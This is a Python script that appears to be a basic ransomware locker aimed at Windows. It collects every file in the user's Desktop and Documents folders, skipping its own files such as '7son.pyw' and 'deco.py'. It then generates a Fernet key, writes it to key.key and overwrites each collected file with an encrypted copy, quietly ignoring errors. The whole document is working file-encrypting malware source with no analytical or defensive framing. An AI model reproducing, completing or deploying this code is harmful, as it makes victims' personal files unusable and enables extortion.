import os
import sys
from cryptography.fernet import Fernet

if os.name != "nt":
    sys.exit()

APPDATA = os.getenv('APPDATA')
USERNAME = os.getenv('USERNAME')
DESK = os.path.join('C:\\Users\\', USERNAME, 'Desktop')
DOCS = os.path.join('C:\\Users\\', USERNAME, 'Documents')
DAT = os.path.join('C:\\Users\\', USERNAME, 'AppData\\Roaming')

files = []

# Search Desktop
for root, dirs, fils in os.walk(DESK):
    for file in fils:
        if file in ['7son.pyw', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
            continue
        filepath = os.path.join(root, file)
        if os.path.isfile(filepath):
            files.append(filepath)

# Search Documents
for root, dirs, fils in os.walk(DOCS):
    for file in fils:
        if file in ['7son.pyw', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
            continue
        filepath = os.path.join(root, file)
        if os.path.isfile(filepath):
            files.append(filepath)



key = Fernet.generate_key()
with open('key.key', 'wb') as tkey:
    tkey.write(key)

for file in files:
    try:
        with open(file, "rb") as f:
            content = f.read()
        conteudo_encriptado = Fernet(key).encrypt(content)
        with open(file, "wb") as f:
            f.write(conteudo_encriptado)
    except PermissionError:
        continue
    except Exception as e:
        pass
